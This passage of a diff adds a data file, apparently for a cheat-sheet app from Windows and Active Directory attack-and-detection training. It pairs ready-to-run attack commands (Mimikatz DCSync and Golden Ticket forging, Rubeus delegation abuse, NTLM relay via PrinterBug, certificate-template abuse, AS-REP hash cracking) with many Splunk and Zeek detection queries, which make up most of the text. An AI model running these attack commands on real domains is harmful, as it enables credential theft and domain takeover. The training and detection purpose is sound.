+      {label:"Edit hash (add 23$ before cracking)",       code:"# Change: $krb5asrep$anni@eagle.local:...\n# To:     $krb5asrep$23$anni@eagle.local:..."},
+      {label:"hashcat – crack AS-REP (mode 18200)",       code:"sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force"},
+    ]
+  },
+  {
+    tab:"attack", title:"GPP Passwords", subtitle:"Decrypt cpassword from SYSVOL XML files",
+    attack:"GPP Passwords", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"PowerSploit – auto-decrypt all GPP creds", code:"Import-Module .\\Get-GPPPassword.ps1\nGet-GPPPassword"},
+    ]
+  },
+  {
+    tab:"attack", title:"Credentials in Shares", subtitle:"Discover and search network shares for plaintext creds",
+    attack:"Credentials in Shares", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"PowerView – find accessible shares",       code:"Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess"},
+      {label:"findstr – search for passwords (LOL)",     code:"findstr /m /s /i \"pass\" *.bat *.cmd *.ini *.config\nfindstr /m /s /i \"pw\" *.config\nfindstr /m /s /i \"eagle\" *.ps1"},
+    ]
+  },
+  {
+    tab:"attack", title:"Credentials in Object Properties", subtitle:"Query AD user Description/Info for stored passwords",
+    attack:"Credentials in Object Properties", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"Custom cmdlet – search AD object fields", code:"SearchUserClearTextInformation -Terms \"pass\"\n# Returns: SamAccountName, Enabled, Description, Info"},
+    ]
+  },
+  {
+    tab:"attack", title:"DCSync", subtitle:"Mimic DC replication to pull all NTLM hashes",
+    attack:"DCSync", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"Mimikatz – DCSync single user",   code:"mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator"},
+      {label:"Mimikatz – DCSync entire domain", code:"mimikatz # lsadump::dcsync /domain:eagle.local /all"},
+      {label:"Impacket – secretsdump (remote)", code:"impacket-secretsdump <domain>/<user>@<DC2_IP>"},
+    ]
+  },
+  {
+    tab:"attack", title:"Golden Ticket", subtitle:"Forge a TGT using the krbtgt NTLM hash",
+    attack:"Golden Ticket", source:"Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Step 1 – DCSync the krbtgt hash",  code:"mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt"},
+      {label:"Step 2 – Get domain SID",           code:"Get-DomainSID\n# e.g. S-1-5-21-1518138621-4282902758-752445584"},
+      {label:"Step 3 – Forge & inject ticket",    code:"mimikatz # kerberos::golden /domain:eagle.local /sid:<SID> /rc4:<krbtgt_hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt"},
+      {label:"Reset krbtgt to invalidate tickets",code:"# Run twice, 10+ hours apart\n# Use KrbtgtKeys.ps1 from Microsoft (has audit mode + forces DC replication)"},
+    ]
+  },
+  {
+    tab:"attack", title:"Kerberos Constrained Delegation", subtitle:"S4U2self + S4U2proxy to impersonate any user",
+    attack:"Constrained Delegation", source:"Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Step 1 – Enumerate delegation accounts",    code:"Get-NetUser -TrustedToAuth\n# Look for: msds-allowedtodelegateto, TRUSTED_TO_AUTH_FOR_DELEGATION"},
+      {label:"Step 2 – Convert password to NTLM hash",    code:"./Rubeus.exe hash /password:Slavi123"},
+      {label:"Step 3 – S4U request (impersonate Admin)",  code:"./Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local /impersonateuser:Administrator /msdsspn:\"http/dc1\" /dc:dc1.eagle.local /ptt"},
+      {label:"Step 3b – Request alt services (LDAP/CIFS)",code:"# Add /altservice:ldap,cifs,time,host to the s4u command above"},
+      {label:"Step 4 – Use ticket for PS remoting",       code:"Enter-PSSession dc1\n# whoami -> eagle\\administrator"},
+    ]
+  },
+  {
+    tab:"attack", title:"PrinterBug + NTLM Relaying", subtitle:"Coerce DC1 auth → relay to DC2 → DCSync",
+    attack:"PrinterBug", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"Step 1 – Start NTLM relay targeting DC2",  code:"impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support"},
+      {label:"Step 2 – Coerce DC1 auth via PrinterBug",  code:"python3 dementor.py <DC1_IP> <Attacker_IP> -u <user> -d <domain> -p <password>"},
+      {label:"Verify SMB signing disabled on DC2",        code:"nmap --script smb2-security-mode -p 445 <DC2_IP>"},
+    ]
+  },
+  {
+    tab:"attack", title:"AD CS – ESC1", subtitle:"Request cert with arbitrary SAN to authenticate as any user",
+    attack:"ESC1", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"Find vulnerable cert templates",          code:"./Certify.exe find /vulnerable"},
+      {label:"Request cert with SAN = Administrator",   code:"./Certify.exe request /ca:PKI.eagle.local\\eagle-PKI-CA /template:UserCert /altname:Administrator"},
+    ]
+  },
+  {
+    tab:"attack", title:"PPID Spoofing (simulate)", subtitle:"Create process with fake parent PID",
+    attack:"PPID Spoofing", source:"Windows Event Logs",
+    color:"#58a6ff",
+    cmds:[
+      {label:"Simulate PPID spoof (psgetsystem)",   code:"powershell -ep bypass\nImport-Module .\\psgetsys.ps1\n[MyProcess]::CreateProcessFromParent(<spoolsv_PID>,\"C:\\Windows\\System32\\cmd.exe\",\"\")"},
+    ]
+  },
+  {
+    tab:"attack", title:"Object ACLs Abuse", subtitle:"Exploit misconfigured ACE rights on AD objects to escalate privileges",
+    attack:"Object ACLs Abuse", source:"Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Step 1 – Collect all ACL paths with SharpHound",        code:"./SharpHound.exe -c All\n# Import the ZIP into BloodHound UI\n# Query: 'Shortest Paths to Domain Admins' or search for your user → Outbound Object Control"},
+      {label:"Step 2a – GenericAll / ForceChangePassword → reset pw", code:"# PowerView\n$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity <target_user> -AccountPassword $pass"},
+      {label:"Step 2b – GenericAll on group → add yourself",          code:"# PowerView\nAdd-DomainGroupMember -Identity '<target_group>' -Members '<your_user>'\n# Verify\nGet-DomainGroupMember -Identity '<target_group>'"},
+      {label:"Step 2c – GenericWrite → add SPN (then Kerberoast)",   code:"# PowerView – set arbitrary SPN on target user\nSet-DomainObject -Identity <target_user> -Set @{serviceprincipalname='fake/LEGIT'}\n# Now Kerberoast that account\n./Rubeus.exe kerberoast /user:<target_user> /outfile:acl_spn.txt"},
+      {label:"Step 2d – WriteOwner → take ownership then GenericAll", code:"# PowerView – take ownership\nSet-DomainObjectOwner -Identity <target_object> -OwnerIdentity <your_user>\n# Grant yourself GenericAll\nAdd-DomainObjectAcl -TargetIdentity <target_object> -PrincipalIdentity <your_user> -Rights All"},
+      {label:"Cleanup – remove SPN after Kerberoasting",              code:"Set-DomainObject -Identity <target_user> -Clear serviceprincipalname"},
+    ]
+  },
+
+  // ── DETECTION & COLLECTION ────────────────────────────────────
+  {
+    tab:"detect", title:"Sysmon – Install & Configure", subtitle:"Driver + service providing process/network/DLL telemetry",
+    attack:"General Detection", source:"Windows Event Logs",
+    color:"#bc8cff",
+    cmds:[
+      {label:"Install Sysmon with full hashing",          code:"sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n"},
+      {label:"Load / update config",                      code:"sysmon.exe -c sysmonconfig-export.xml"},
+      {label:"To capture ALL EID 7 (Image Loads)",        code:"# In config XML: switch ImageLoad rule to onmatch=\"exclude\" with no rules inside"},
+    ]
+  },
+  {
+    tab:"detect", title:"ETW – Enumerate Providers & Sessions", subtitle:"Query running ETW sessions and available providers",
+    attack:"General Detection", source:"Windows Event Logs",
+    color:"#f0883e",
+    cmds:[
+      {label:"List all running ETW sessions",      code:"logman query -ets"},
+      {label:"Inspect a specific session",         code:"logman query \"EventLog-Security\" -ets"},
+      {label:"List all providers",                 code:"logman query providers"},
+      {label:"Search providers by name",           code:"logman query providers | findstr \"Kernel\""},
+      {label:"Get provider keywords/levels",       code:"logman query providers Microsoft-Windows-Kernel-Process"},
+    ]
+  },
+  {
+    tab:"detect", title:"SilkETW – Capture ETW Traces", subtitle:"Wrap ETW providers into JSON files or Windows Event Log",
+    attack:"PPID Spoofing / .NET Injection", source:"Windows Event Logs",
+    color:"#f0883e",
+    cmds:[
+      {label:"Capture Kernel-Process (PPID spoof detection)", code:"SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\\windows\\temp\\etw.json"},
+      {label:"Capture DotNETRuntime (in-memory .NET)",        code:"SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\\windows\\temp\\etw.json"},
+      {label:"0x2038 keyword breakdown",                      code:"# 0x8    = Loader (assembly loads)\n# 0x10   = JIT (compiled method names)\n# 0x20   = NGen (precompiled images)\n# 0x2000 = Interop (managed→native calls)"},
+    ]
+  },
+  {
+    tab:"detect", title:"Get-WinEvent – Query Event Logs", subtitle:"PowerShell workhorse for live logs and .evtx files",
+    attack:"General Detection", source:"Windows Event Logs",
+    color:"#bc8cff",
+    cmds:[
+      {label:"List all logs with record counts",       code:"Get-WinEvent -ListLog * | Select LogName, RecordCount, IsEnabled | ft -AutoSize"},
+      {label:"Latest 50 events from Security log",     code:"Get-WinEvent -LogName 'System' -MaxEvents 50"},
+      {label:"Read from .evtx file",                   code:"Get-WinEvent -Path 'C:\\path\\to\\file.evtx' -MaxEvents 5"},
+      {label:"FilterHashtable by ID (fast)",           code:"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3}"},
+      {label:"FilterHashtable from .evtx folder",      code:"Get-WinEvent -FilterHashtable @{Path='C:\\Logs\\*.evtx'; ID=5142}"},
+      {label:"FilterHashtable with date range",        code:"$start = (Get-Date -Year 2023 -Month 5 -Day 28).Date\n$end   = (Get-Date -Year 2023 -Month 6 -Day 3).Date\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$start; EndTime=$end}"},
+      {label:"FilterXPath – .NET DLL loads (EID 7)",  code:"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'} -FilterXPath \"*[System[EventID=7] and EventData[Data[@Name='ImageLoaded'] and (Data='C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll' or Data='C:\\Windows\\System32\\mscoree.dll')]]\""},
+      {label:"FilterXPath – connections to IP (EID 3)",code:"Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath \"*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='52.113.194.132']]\""},
+      {label:"XML parse – extract EID 3 fields",       code:"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} | ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    $d   = $xml.Event.EventData.Data\n    New-Object PSObject -Property @{\n        SourceIP      = ($d | Where-Object {$_.Name -eq 'SourceIp'}).'#text'\n        DestinationIP = ($d | Where-Object {$_.Name -eq 'DestinationIp'}).'#text'\n        ProcessId     = ($d | Where-Object {$_.Name -eq 'ProcessId'}).'#text'\n    }\n} | Where-Object {$_.DestinationIP -eq '52.113.194.132'}"},
+      {label:"Where-Object – find encoded commands",   code:"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Properties.Value -like '*-enc*'} | Format-List"},
+      {label:"Skill: DLL hijack (unsigned, EID 7)",    code:"Get-WinEvent -Path 'C:\\Logs\\DLLHijack\\*' | Where-Object {$_.ID -eq 7} | Where-Object {$_.Message -like '*signed: false*'} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message"},
+      {label:"Skill: LSASS access by PID (EID 10)",    code:"Get-WinEvent -Path 'C:\\Logs\\PowershellExec\\*' | Where-Object { $_.ID -eq 10 -and $_.Message -match '3776' } | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message"},
+    ]
+  },
+  {
+    tab:"detect", title:"LLMNR Honeypot Log Source", subtitle:"Create custom event log for LLMNR detection script",
+    attack:"LLMNR Poisoning", source:"Detecting Windows Attacks",
+    color:"#3fb950",
+    cmds:[
+      {label:"Create custom Application event log source", code:"New-EventLog -LogName Application -Source LLMNRDetection"},
+    ]
+  },
+
+  // ── SPLUNK SPL ────────────────────────────────────────────────
+  {
+    tab:"splunk", title:"User / Domain Recon – Native Tools", subtitle:"Detect parent process spawning 3+ recon binaries",
+    attack:"Recon", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – native recon tools (Sysmon EID 1)", code:"index=main source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventID=1 earliest=1690447949 latest=1690450687\n| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe)\n  OR (process_name IN (cmd.exe,powershell.exe) AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))\n| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user\n| where mvcount(process) > 3"},
+    ]
+  },
+  {
+    tab:"splunk", title:"User / Domain Recon – BloodHound LDAP", subtitle:"Detect BloodHound LDAP burst via SilkETW",
+    attack:"Recon", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – BloodHound LDAP via SilkService", code:"index=main earliest=1690195896 latest=1690285475 source=\"WinEventLog:SilkService-Log\"\n| spath input=Message\n| rename XmlEventData.* as *\n| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter\n| sort 0 _time\n| search SearchFilter=\"*(samAccountType=805306368)*\"\n| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId\n| where count > 10\n| convert ctime(maxTime)"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Password Spraying", subtitle:"Many failed logons from single source IP across distinct users",
+    attack:"Password Spraying", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – failed logon spike (EID 4625)", code:"index=main earliest=1690280680 latest=1690289489 source=\"WinEventLog:Security\" EventCode=4625\n| bin span=15m _time\n| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason"},
+    ]
+  },
+  {
+    tab:"splunk", title:"LLMNR / NBT-NS Poisoning", subtitle:"Detect via LLMNRDetection log, Sysmon DNS, and explicit logons",
+    attack:"LLMNR Poisoning", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – LLMNRDetection custom log",   code:"index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection\n| table _time, ComputerName, SourceName, Message"},
+      {label:"SPL – Sysmon EID 22 DNS queries",   code:"index=main earliest=1690290078 latest=1690291207 EventCode=22\n| table _time, Computer, user, Image, QueryName, QueryResults"},
+      {label:"SPL – EID 4648 explicit logon trap", code:"index=main earliest=1690290814 latest=1690291207 EventCode IN (4648)\n| table _time, EventCode, source, name, user, Target_Server_Name, Message\n| sort 0 _time"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Kerberoasting – TGS with No Logon", subtitle:"Find TGS requests without a subsequent explicit logon",
+    attack:"Kerberoasting", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – EID 4648 + 4769 correlation",      code:"index=main earliest=1690388417 latest=1690388630 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?<username>[^@]+)\"\n| table _time, ComputerName, EventCode, name, username, Account_Name, src_ip, service_name, Ticket_Encryption_Type"},
+      {label:"SPL – SPN LDAP query detection",         code:"index=main earliest=1690448444 latest=1690454437 source=\"WinEventLog:SilkService-Log\"\n| spath input=Message\n| rename XmlEventData.* as *\n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter\n| search SearchFilter=\"*(&(samAccountType=805306368)(servicePrincipalName=*)*\""},
+      {label:"SPL – TGS without logon (bin method)",   code:"index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?<username>[^@]+)\"\n| bin span=2m _time\n| search username!=*$\n| stats values(EventCode) as Events, values(service_name) as service_name by _time, username\n| where !match(Events,\"4648\")"},
+      {label:"SPL – TGS without logon (transaction)",  code:"index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?<username>[^@]+)\"\n| search username!=*$\n| transaction username keepevicted=true maxspan=5s endswith=(EventCode=4648) startswith=(EventCode=4769)\n| where closed_txn=0 AND EventCode=4769\n| table _time, EventCode, service_name, username"},
+    ]
+  },
+  {
+    tab:"splunk", title:"AS-REProasting", subtitle:"TGT requests with Pre_Authentication_Type=0",
+    attack:"AS-REProasting", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – LDAP query for pre-auth disabled accounts", code:"index=main earliest=1690392745 latest=1690393283 source=\"WinEventLog:SilkService-Log\"\n| spath input=Message\n| rename XmlEventData.* as *\n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter\n| search SearchFilter=\"*(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)*\""},
+      {label:"SPL – EID 4768 with Pre_Authentication_Type=0",   code:"index=main earliest=1690392745 latest=1690393283 source=\"WinEventLog:Security\" EventCode=4768 Pre_Authentication_Type=0\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?<src_ip>[0-9\\.]+)\"\n| table _time, src_ip, user, Pre_Authentication_Type, Ticket_Options, Ticket_Encryption_Type"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Pass-the-Hash", subtitle:"LogonType=9 + seclogo + LSASS access correlation",
+    attack:"Pass-the-Hash", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – Basic: EID 4624 LogonType=9 + seclogo", code:"index=main earliest=1690450708 latest=1690451116 source=\"WinEventLog:Security\"\nEventCode=4624 Logon_Type=9 Logon_Process=seclogo\n| table _time, ComputerName, EventCode, user, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process"},
+      {label:"SPL – Enhanced: LSASS access → NewCredentials transaction", code:"index=main earliest=1690543380 latest=1690545180\n(source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=10\n  TargetImage=\"C:\\\\Windows\\\\system32\\\\lsass.exe\"\n  SourceImage!=\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\platform\\\\*\\\\MsMpEng.exe\")\nOR\n(source=\"WinEventLog:Security\" EventCode=4624 Logon_Type=9 Logon_Process=seclogo)\n| sort _time, RecordNumber\n| transaction host maxspan=1m endswith=(EventCode=4624) startswith=(EventCode=10)\n| stats count by _time, Computer, SourceImage, SourceProcessId, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process\n| fields - count"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Pass-the-Ticket / Golden Ticket", subtitle:"TGS/TGT renewal with no preceding TGT request",
+    attack:"Pass-the-Ticket / Golden Ticket", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – 4769/4770 without prior 4768 (transaction)", code:"index=main earliest=1690392405 latest=1690451745\nsource=\"WinEventLog:Security\" user!=*$\nEventCode IN (4768,4769,4770)\n| rex field=user \"(?<username>[^@]+)\"\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?<src_ip_4>[0-9\\.]+)\"\n| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)\n| where closed_txn=0\n| search NOT user=\"*$@*\"\n| table _time, ComputerName, username, src_ip_4, service_name, category"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Overpass-the-Hash", subtitle:"Non-lsass process connecting to port 88 (Rubeus AS-REQ)",
+    attack:"Overpass-the-Hash", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – Sysmon EID 3 to port 88, not lsass", code:"index=main earliest=1690443407 latest=1690443544\nsource=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\"\n(EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1\n| eventstats values(process) as process by process_id\n| where EventCode=3\n| stats count by _time, Computer, dest_ip, dest_port, Image, process\n| fields - count"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Silver Ticket", subtitle:"Logon from user not in account-creation baseline",
+    attack:"Silver Ticket", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"Step 1 – Build users.csv baseline from EID 4720", code:"index=main latest=1690448444 EventCode=4720\n| stats min(_time) as _time, values(EventCode) as EventCode by user\n| outputlookup users.csv"},
+      {label:"Step 2 – Find logons from unknown users (4624)",   code:"index=main latest=1690545656 EventCode=4624\n| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user\n| eval last24h = 1690451977\n| where firstTime > last24h\n| convert ctime(firstTime) ctime(last24h)\n| lookup users.csv user as user OUTPUT EventCode as Events\n| where isnull(Events)"},
+      {label:"Step 3 – Anomalous special-privilege logons (4672)", code:"index=main latest=1690545656 EventCode=4672\n| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name\n| eval last24h = 1690451977\n| where firstTime > last24h\n| table firstTime, ComputerName, Account_Name\n| convert ctime(firstTime)"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Unconstrained Delegation Discovery", subtitle:"PowerShell querying TrustedForDelegation (EID 4104)",
+    attack:"Unconstrained Delegation", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – EID 4104 TrustedForDelegation query", code:"index=main earliest=1690544538 latest=1690544540\nsource=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104\nMessage=\"*TrustedForDelegation*\" OR Message=\"*userAccountControl:1.2.840.113556.1.4.803:=524288*\"\n| table _time, ComputerName, EventCode, Message"},
+    ]
+  },
+  {
+    tab:"splunk", title:"Constrained Delegation Discovery + Rubeus", subtitle:"PS querying msDS-AllowedToDelegateTo + port 88 conn",
+    attack:"Constrained Delegation", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – EID 4104 msDS-AllowedToDelegateTo",   code:"index=main earliest=1690544553 latest=1690562556\nsource=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104\nMessage=\"*msDS-AllowedToDelegateTo*\"\n| table _time, ComputerName, EventCode, Message"},
+      {label:"SPL – Rubeus S4U via Sysmon port 88",        code:"index=main earliest=1690562367 latest=1690562556\nsource=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\"\n| eventstats values(process) as process by process_id\n| where EventCode=3 AND dest_port=88\n| table _time, Computer, dest_ip, dest_port, Image, process"},
+    ]
+  },
+  {
+    tab:"splunk", title:"DCSync", subtitle:"EID 4662 DS-Replication triggered by non-DC account",
+    attack:"DCSync", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – 4662 Replicating Directory Changes", code:"index=main earliest=1690544278 latest=1690544280\nEventCode=4662 Message=\"*Replicating Directory Changes*\"\n| rex field=Message \"(?P<property>Replicating Directory Changes.*)\"\n| table _time, user, object_file_name, Object_Server, property"},
+    ]
+  },
+  {
+    tab:"splunk", title:"DCShadow", subtitle:"EID 4742 computer account gaining GC/ SPN",
+    attack:"DCShadow", source:"Detecting Windows Attacks",
+    color:"#76e3ea",
+    cmds:[
+      {label:"SPL – 4742 unexpected GC/ SPN addition", code:"index=main earliest=1690623888 latest=1690623890\nEventCode=4742\n| rex field=Message \"(?P<gcspn>GC\\/[a-zA-Z0-9\\.\\-\\/]+)\"\n| table _time, ComputerName, Security_ID, Account_Name, user, gcspn\n| search gcspn=*"},
+    ]
+  },
+
+  // ── ZEEK ──────────────────────────────────────────────────────
+  {
+    tab:"zeek", title:"SSH Brute Force", subtitle:"30+ auth attempts from single source in 5 minutes",
+    attack:"SSH Bruteforce", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – SSH auth attempts spike", code:"index=ssh_bruteforce sourcetype=\"bro:ssh:json\"\n| bucket _time span=5m\n| stats sum(auth_attempts) as total_attempts, values(client) as client, values(server) as server by _time, id.orig_h, id.resp_h\n| where total_attempts > 30\n| table _time, id.orig_h, id.resp_h, client, server, total_attempts\n| rename id.orig_h as src_ip, id.resp_h as dest_ip"},
+    ]
+  },
+  {
+    tab:"zeek", title:"C2 Beaconing", subtitle:"Highly regular outbound HTTP intervals (±10% jitter)",
+    attack:"Beaconing", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – beacon interval regularity (>90% consistent)", code:"index=\"cobaltstrike_beacon\" sourcetype=\"bro:http:json\"\n| sort 0 _time\n| streamstats current=f last(_time) as prevtime by src, dest, dest_port\n| eval timedelta = _time - prevtime\n| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port\n| eval upper=avg*1.1\n| eval lower=avg*0.9\n| where timedelta > lower AND timedelta < upper\n| stats count, values(avg) as TimeInterval by src, dest, dest_port, total\n| eval prcnt = (count/total)*100\n| where prcnt > 90 AND total > 10"},
+    ]
+  },
+  {
+    tab:"zeek", title:"BloodHound DCE-RPC Enumeration", subtitle:"High unique DCE-RPC operation count → AD enumeration",
+    attack:"Recon / BloodHound", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – BloodHound DCE-RPC unique ops > 9", code:"index=\"bloodhound_all_no_kerberos_sign\" sourcetype=\"bro:dce_rpc:json\"\n| stats dc(operation) as unique_ops, values(operation) as operations, count by id.orig_h, id.resp_h\n| where unique_ops > 9\n| sort - unique_ops"},
+    ]
+  },
+  {
+    tab:"zeek", title:"PrintNightmare", subtitle:"RpcAddPrinterDriver / RpcAddPrinterDriverEx DCE-RPC calls",
+    attack:"PrintNightmare", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – PrintNightmare DCE-RPC operations", code:"index=\"printnightmare\" sourcetype=\"bro:dce_rpc:json\"\n| where operation IN (\"RpcAddPrinterDriver\", \"RpcAddPrinterDriverEx\")\n| stats count by id.orig_h, id.resp_h, operation\n| sort - count"},
+    ]
+  },
+  {
+    tab:"zeek", title:"Nmap Port Scan", subtitle:"Zero-payload SYN packets to multiple ports",
+    attack:"Nmap", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – zero-byte connections to 3+ distinct ports", code:"index=\"cobaltstrike_beacon\" sourcetype=\"bro:conn:json\" orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8)\n| bin span=5m _time\n| stats dc(dest_port) as num_dest_port, values(dest_port) as ports by _time, src_ip, dest_ip\n| where num_dest_port >= 3"},
+    ]
+  },
+  {
+    tab:"zeek", title:"Kerberoasting (Wire Level)", subtitle:"RC4-HMAC TGS-REQ downgrades on port 88",
+    attack:"Kerberoasting", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – TGS with cipher=rc4-hmac (forced downgrade)", code:"index=\"sharphound\" sourcetype=\"bro:kerberos:json\" request_type=TGS cipher=\"rc4-hmac\" forwardable=\"true\" renewable=\"true\"\n| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service"},
+    ]
+  },
+  {
+    tab:"zeek", title:"Golden Ticket (Wire Level)", subtitle:"TGS-only flow with no prior AS-REQ from same source",
+    attack:"Golden Ticket", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – TGS-only (no AS) in 1-min window", code:"index=\"golden_ticket_attack\" sourcetype=\"bro:kerberos:json\"\n| where client!=\"-\"\n| bin _time span=1m\n| stats values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h\n| where request_types==\"TGS\" AND unique_request_types==1"},
+    ]
+  },
+  {
+    tab:"zeek", title:"Cobalt Strike PSExec", subtitle:"Executable drop to ADMIN$ or C$ via SMB",
+    attack:"Cobalt Strike PSExec", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – EXE/DLL/BAT dropped to admin shares", code:"index=\"cobalt_strike_psexec\" sourcetype=\"bro:smb_files:json\" action=\"SMB::FILE_OPEN\"\nname IN (\"*.exe\", \"*.dll\", \"*.bat\")\npath IN (\"*\\\\c$\", \"*\\\\ADMIN$\") size>0"},
+    ]
+  },
+  {
+    tab:"zeek", title:"DNS Exfiltration", subtitle:"Long DNS subdomains (40+ chars) at high frequency",
+    attack:"DNS Exfiltration", source:"Detecting Windows Attacks",
+    color:"#f0883e",
+    cmds:[
+      {label:"Zeek – DNS query length > 40 at > 60/day", code:"index=dns_exf sourcetype=\"bro:dns:json\"\n| eval len_query=len(query)\n| search len_query>=40 AND query!=\"*.[ip6.arpa]*\" AND query!=\"*amazonaws.com*\" AND query!=\"*._googlecast.*\" AND query!=\"_ldap.*\"\n| bin _time span=24h\n| stats count(query) as req_by_day, values(query) as queries by _time, id.orig_h, id.resp_h\n| where req_by_day>60\n| table _time, id.orig_h, id.resp_h, req_by_day, queries"},
+    ]
+  },
+  {
+    tab:"zeek", title:"Ransomware – Excessive File Overwrite", subtitle:"SMB FILE_OPEN + FILE_RENAME > 100 in 5 min",
